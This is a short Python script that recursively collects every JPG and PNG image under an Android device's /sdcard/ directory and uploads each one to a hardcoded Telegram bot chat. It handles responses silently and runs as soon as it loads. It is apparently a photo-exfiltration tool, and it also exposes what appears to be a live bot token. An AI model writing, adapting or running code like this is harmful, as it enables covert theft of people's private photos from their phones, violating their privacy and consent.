import os
import requests

# Your bot's token
BOT_TOKEN = '7367021244:AAE7J51xfn7XHSg4wPS9-Rqh5ax8b-1QdhU'
# Your chat ID (user or group where you want to send the photos)
CHAT_ID = '6568295648'
# Path to the directory containing the photos
DIRECTORY = '/sdcard/'

def send_photo(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            pass
        else:
            pass

def send_all_photos(directory):
    # Use os.walk to traverse all directories and subdirectories
    for root, dirs, files in os.walk(directory):
        for filename in files:
            if filename.endswith(('.jpg', '.jpeg', '.png')):
                photo_path = os.path.join(root, filename)
                send_photo(photo_path)

# Run the function to send all photos
send_all_photos(DIRECTORY)
